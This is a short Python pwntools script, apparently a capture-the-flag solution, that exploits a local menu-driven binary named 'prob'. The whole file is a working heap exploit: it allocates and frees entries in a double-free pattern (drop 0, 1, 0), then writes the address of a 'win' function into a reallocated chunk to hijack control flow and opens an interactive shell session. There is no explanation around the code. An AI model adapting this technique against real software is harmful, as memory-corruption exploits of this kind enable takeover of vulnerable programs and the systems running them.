from pwn import *

io = process('./prob')
e = ELF('./prob')

win = 0x400cd4

def make(name):
    io.recvuntil(' >> ')
    io.sendline('1')
    io.recvuntil(' >> ')
    io.sendline(name)

def drop(idx):
    io.recvuntil(' >> ')
    io.sendline('2')
    io.recvuntil(' >> ')
    io.sendline(str(idx))

def make_gun():
    io.recvuntil(' >> ')
    io.sendline('3')

def challenge():
    io.recvuntil(' >> ')
    io.sendline('4')

def main():
    make('123')
    make('234')
    make('345')

    drop(0)
    drop(1)
    drop(0)

    make_gun()
    make('456')
    make(p64(win))

    io.interactive()

main()
